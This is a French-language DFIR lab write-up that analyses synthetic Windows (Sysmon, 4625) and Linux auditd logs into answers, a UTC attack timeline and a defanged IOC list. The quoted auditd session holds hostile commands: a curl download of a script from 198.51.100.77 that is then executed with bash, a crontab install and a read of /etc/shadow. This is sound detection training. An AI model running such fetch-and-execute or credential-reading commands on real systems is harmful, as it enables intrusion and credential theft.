# Mes réponses, la chronologie et la liste d'IOC (exemples synthétiques)

[English](my-timeline.md) · **Français** · [Deutsch](my-timeline.de.md)

Toutes les données viennent des fichiers **synthétiques** dans [`samples/`](samples/).
Les commandes sont celles du README du lab ; les sorties citées ci-dessous
sont ce que j'ai obtenu en les lançant (jq 1.7, audit en espace utilisateur
4.0.2 sur Debian 13, `TZ=UTC`).

## Partie A — Windows (Sysmon + journal Security)

Nombre d'événements par ID (`jq -r '.EventID' sysmon.synthetic.jsonl | sort | uniq -c`) :

```text
      6 1
      2 11
      1 13
      2 22
      5 3
```

Créations de processus (EventID 1), raccourcies :

```text
09:12:03  explorer.exe  -> WINWORD.EXE   /n "C:\Users\c.martin\Downloads\Facture_4471.docm"
09:12:17  WINWORD.EXE   -> powershell.exe -NoP -W Hidden -enc VwByAGkAdABl...
09:12:23  powershell.exe-> C:\Users\c.martin\AppData\Roaming\SyncHelper\synchelper.exe --silent
09:14:03  explorer.exe  -> chrome.exe                      (normal user activity)
09:17:03  cmd.exe       -> whoami /all
09:17:05  cmd.exe       -> net group "Domain Admins" /domain
```

Charge `-enc` décodée (base64 → UTF-16LE) :

```text
Write-Output 'SYNTHETIC LAB EVENT - harmless'
```

Connexions réseau (EventID 3) :

```text
09:12:18  powershell.exe  198.51.100.77  cdn-update.example.net  443
09:13:23  synchelper.exe  198.51.100.77  cdn-update.example.net  443
09:14:23  synchelper.exe  198.51.100.77  cdn-update.example.net  443
09:15:23  synchelper.exe  198.51.100.77  cdn-update.example.net  443
09:16:23  synchelper.exe  198.51.100.77  cdn-update.example.net  443
```

Ouvertures de session échouées (4625) par source : `12 203.0.113.45`, `2 10.20.30.57`.

### Réponses

1. **Document initial / utilisateur :** `Facture_4471.docm` (fichier Word à
   macros, dans le dossier Téléchargements) ouvert par `CORP\c.martin` sur
   `WS-COMPTA-07` à 09:12:03 UTC.
2. **Chaîne de processus :** `explorer.exe → WINWORD.EXE → powershell.exe
   (caché, encodé) → synchelper.exe`. Word qui lance PowerShell est l'anomalie
   principale — Office n'a aucune raison normale de lancer un interpréteur de
   script.
3. **Contact / dépôt :** PowerShell a résolu `cdn-update.example.net` →
   `198.51.100.77` (Sysmon 22), s'est connecté sur 443 (Sysmon 3) et a écrit
   `C:\Users\c.martin\AppData\Roaming\SyncHelper\synchelper.exe` (Sysmon 11,
   09:12:20), qu'il a démarré 3 s plus tard.
4. **Persistance :** Sysmon 13 à 09:12:21, valeur
   `HKU\S-1-5-21-…-1105\Software\Microsoft\Windows\CurrentVersion\Run\SyncHelper`
   = `C:\Users\c.martin\AppData\Roaming\SyncHelper\synchelper.exe` — une clé Run
   par utilisateur qui pointe vers un chemin modifiable par l'utilisateur.
5. **Intervalle de beacon :** 09:13:23, 09:14:23, 09:15:23, 09:16:23 →
   exactement **60 s**, sans jitter. Une régularité parfaite est typique d'un
   rappel automatique.
6. **Découverte :** `whoami /all` puis `net group "Domain Admins" /domain` à
   09:17. Le second liste les comptes les plus privilégiés — la cible suivante
   habituelle. Trou que j'ai vu : il n'y a pas d'événement Sysmon 1 pour le
   parent de `cmd.exe`, donc je ne peux pas dire, avec ces exemples, ce qui
   l'a lancé (sur le vrai hôte je chercherais un événement manquant ou un
   autre parent).
7. **SubStatus 4625 :** `0xc0000064` = le nom d'utilisateur n'existe pas ;
   `0xc000006a` = l'utilisateur existe, mauvais mot de passe. Depuis
   `203.0.113.45`, 12 échecs en environ 2,5 minutes sur 6 noms
   (`administrator`, `admin`, `c.martin`, `j.dupont`, `scanner`, `backup`),
   type d'ouverture 3 (réseau), pas de nom de poste → devinette automatique de
   mots de passe depuis l'extérieur, et le mélange des deux codes me dit quels
   noms sont de vrais comptes (`administrator`, `c.martin`, `j.dupont`). Les
   deux échecs depuis `10.20.30.57` (`WS-COMPTA-07`, utilisateur `c.martin`)
   ressemblent à des fautes de frappe ordinaires.

## Partie B — Linux (auditd)

`aureport -if auditd.synthetic.log -au` (TZ=UTC) :

```text
1. 09/14/26 21:40:00 deploy 203.0.113.45 ssh /usr/sbin/sshd no 2001
2. 09/14/26 21:40:03 deploy 203.0.113.45 ssh /usr/sbin/sshd no 2002
3. 09/14/26 21:40:09 deploy 203.0.113.45 ssh /usr/sbin/sshd yes 2003
```

Session 7 (`ausearch --session 7 -i | grep -E 'proctitle|USER_'`), raccourcie :

```text
21:40:10  USER_LOGIN  auid=1002 addr=203.0.113.45 res=success
21:40:30  id
21:40:45  curl -s -o /tmp/.cache-upd.sh http://198.51.100.77/update.sh
21:40:52  chmod +x /tmp/.cache-upd.sh
21:40:55  bash /tmp/.cache-upd.sh
21:40:57  crontab /tmp/.c
21:40:58  cat /etc/shadow   -> openat success=no exit=EACCES key=shadow_read
```

Note : `aureport`/`ausearch` affichent « Error opening config file (Permission
denied) » lancés en utilisateur normal ; c'est sans effet avec `-if` (repli
sur les valeurs par défaut intégrées). Sans `TZ=UTC` les heures sont en heure
locale — à garder en tête quand on construit une chronologie UTC.

### Réponses

1. `203.0.113.45` : deux connexions SSH échouées puis un succès pour
   **`deploy`** en 9 secondes.
2. Séquence ci-dessus : reco (`id`) → téléchargement vers un fichier caché
   dans `/tmp` → le rendre exécutable → le lancer → installer une crontab →
   essayer de lire `/etc/shadow`.
3. `auid` (UID d'audit/de connexion) est posé à la connexion et **survit à
   `sudo`/`su`**, donc il continue de pointer vers le compte qui s'est
   connecté (ici 1002 = `deploy`) même si le processus tourne ensuite en
   root. `uid` ne montre que l'identité courante.
4. La lecture de `/etc/shadow` a échoué avec `EACCES`. Une tentative ratée
   montre quand même l'intention (accès aux identifiants) et prouve que la
   session est hostile — un utilisateur `deploy` ordinaire n'a aucune raison
   de le lire.
5. Contrôles suivants sur un vrai hôte : `crontab -l -u deploy`, hash et
   contenu de `/tmp/.cache-upd.sh` et `/tmp/.c`, connexions sortantes
   (`ss -tnp`) et journaux de pare-feu/proxy pour `198.51.100.77`, autres
   connexions depuis `203.0.113.45`, si le mot de passe de `deploy` est
   réutilisé ailleurs, puis contenir (verrouiller le compte, bloquer l'IP)
   et escalader.

## Partie C — Chronologie (UTC, 2026-09-14)

| Heure | Hôte | Source | Événement | Signification |
|-------|------|--------|-----------|--------|
| 07:55:00–07:57:23 | SRV-FILES-01 | Security 4625 | 12 ouvertures de session réseau échouées depuis 203.0.113.45, 6 noms d'utilisateurs | Devinette de mots de passe ; révèle les noms valides |
| 07:55:40, 08:01:40 | SRV-FILES-01 | Security 4625 | c.martin depuis 10.20.30.57 | Probablement des fautes de frappe (bénin) |
| 09:12:03 | WS-COMPTA-07 | Sysmon 1 | c.martin ouvre `Facture_4471.docm` | Accès initial (document malveillant) |
| 09:12:17 | WS-COMPTA-07 | Sysmon 1 | WINWORD → PowerShell caché et encodé | Exécution |
| 09:12:18 | WS-COMPTA-07 | Sysmon 22/3 | DNS + HTTPS vers cdn-update.example.net (198.51.100.77) | Téléchargement / C2 |
| 09:12:20 | WS-COMPTA-07 | Sysmon 11 | `synchelper.exe` écrit dans AppData\Roaming | Charge déposée |
| 09:12:21 | WS-COMPTA-07 | Sysmon 13 | HKU\…\Run\SyncHelper | Persistance |
| 09:12:23 | WS-COMPTA-07 | Sysmon 1 | synchelper.exe --silent | La charge s'exécute |
| 09:13:23–09:16:23 | WS-COMPTA-07 | Sysmon 3 | Connexions toutes les 60 s vers 198.51.100.77:443 | Beaconing |
| 09:17:03–05 | WS-COMPTA-07 | Sysmon 1 | `whoami /all`, `net group "Domain Admins" /domain` | Découverte |
| 21:40:00–09 | web01 | auditd USER_AUTH | 2 échecs + 1 connexion SSH réussie, `deploy`, depuis 203.0.113.45 | Compte valide après devinette |
| 21:40:45 | web01 | auditd EXECVE | curl vers `/tmp/.cache-upd.sh` depuis 198.51.100.77 | Transfert d'outil |
| 21:40:55 | web01 | auditd EXECVE | `bash /tmp/.cache-upd.sh` | Exécution depuis /tmp |
| 21:40:57 | web01 | auditd EXECVE | `crontab /tmp/.c` | Persistance |
| 21:40:58 | web01 | auditd SYSCALL | `cat /etc/shadow` refusé | Tentative d'accès aux identifiants |

Lien entre les deux histoires : la même adresse externe 203.0.113.45 devine
des mots de passe Windows le matin et entre sur `web01` le soir, et
198.51.100.77 sert à la fois la charge Windows et le script Linux.

## Liste d'IOC

Extraits avec mon propre outil
(`cat samples/*.jsonl samples/auditd.synthetic.log | python -m seclab.ioc --defang`),
puis triés à la main en interne / externe :

| Type | Valeur (defanged) | Rôle |
|------|-------------------|------|
| IPv4 | 203[.]0[.]113[.]45 | Devinette de mots de passe (Windows + SSH) |
| IPv4 | 198[.]51[.]100[.]77 | Serveur de charge / C2 |
| Domaine | cdn-update[.]example[.]net | Résout vers 198.51.100.77 |
| URL | hxxp://198[.]51[.]100[.]77/update.sh | Téléchargement du script Linux |
| Fichier | `%APPDATA%\SyncHelper\synchelper.exe` (placeholder SHA256 `…0003`) | Charge Windows |
| Fichier | `/tmp/.cache-upd.sh`, `/tmp/.c` | Script Linux, fichier crontab |
| Registre | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SyncHelper` | Persistance |
| Fichier | `Facture_4471.docm` | Document initial |

L'outil a aussi renvoyé des valeurs internes (`10.20.30.57`, `10.20.30.20`,
`intranet.example.com`, les noms d'hôtes du lab) et les hash placeholder
des binaires légitimes (Word, PowerShell, Chrome, whoami, net). C'est du
contexte, pas des indicateurs, donc je les ai laissés de côté — l'extracteur
trouve des chaînes, l'analyste décide ce qui est malveillant.
